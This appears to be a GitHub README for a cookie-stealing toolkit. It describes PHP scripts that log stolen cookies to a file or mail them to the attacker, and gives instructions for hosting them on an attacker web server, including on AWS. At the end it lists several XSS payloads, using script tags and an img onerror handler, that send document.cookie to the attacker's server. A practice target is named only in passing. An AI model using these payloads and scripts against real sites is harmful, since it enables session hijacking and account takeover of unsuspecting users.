# hacksudo-cookies-stealer
<h2> 1 method </h2>
here we created PHP Cookie Stealing Scripts which use in XSS/stored/relfect

1. **Cookiesteal-simple.php** - Records whatever "c" parameter holds, in example case the **document.cookie string,** writes value to **log.txt.** 

2. **Cookiemail.php** - This version code will mail the cookies to hacker mail using the PHP() mail function with subject “Stolen cookies”.

3. Cookiesteal-v.php (**verbose**) - **Collects the IP address, port numbe**r, **host**(usually computer-name), user agent and cookie.

## How To Usage
**you can use PHP server**
<h3>php -S attackerIP:80</h3> ( user attacker ip , and port you can use 8080 also ,
but remeber your apache2 must  stop now )
do this command at same path where you took your cookies script done your ready now ...
now find XSS site , for practice purpose you can use Beebox .<br>which is available at www.root-me.org , get XSS and use XSS paylaod which is given below of this README

Mail cookies stealer are very interesting <br>
Use mail scripts on working SMTP Webserver else it will not work

enjoy :D 
www.hacksudo.com/contact

<br>vishal@hacksudo.com

<h2>2 method </h2>
1. On the remote attacker machine, start the webserver (Apache2 in example),
```
sudo service apache2 start
```
2. Git clone the repo locally and then push the chosen "Cookie stealer" PHP script from local host to the attacking machine

```
git clone https://github.com/hacksudo/hacksudo-cookies-stealer

cd hacksudo-cookies-stealer

sudo scp cookiestealer-simple.php username@AttackMachine:/var/www/html/

sudo scp log.txt username@AttackMachine:/var/www/html/
```
**AWS Version**:

```
scp -i AWS-Key.pem cookiesteal-simple.php ec2-user@ec2[YOUR IP].us-east-2.compute.amazonaws.com:~/.

sudo mv cookiestealer-simple.php /var/www/html/
```

Example: http://[Attacker Webserver]/cookiesteal-simple.php

##### Setting Permissions:

Figure out which user is owning httpd process using the following command:
```
ps aux | grep httpd
```
Output should be similar to this:
```
ec2-user  1569  0.0  0.1  12840  1064 pts/0    S+   17:55   0:00 grep httpd
```
So now you know the user who is trying to write files, which is in this case ec2-user You can now go ahead and set the permission for directory where your php script is trying to write something:
```
sudo chown ec2-user:ec2-user /var/www/html/

sudo chmod 755 /var/www/html/
```

_XSS Payload Examples_:
* <script javascript:text>document.location="http://[Attacker Webserver]cookiesteal-simple.php?c=" + document.cookie + "&t=Alert"; </script>

* <script>document.location='http://[Attacker Webserver]/cookiesteal-v.php?cookie=' + document.cookie</script>

* <img src=x onerror=this.src='http://[Attacker Webserver]/cookiesteal-v.php?cookie='+document.cookie>
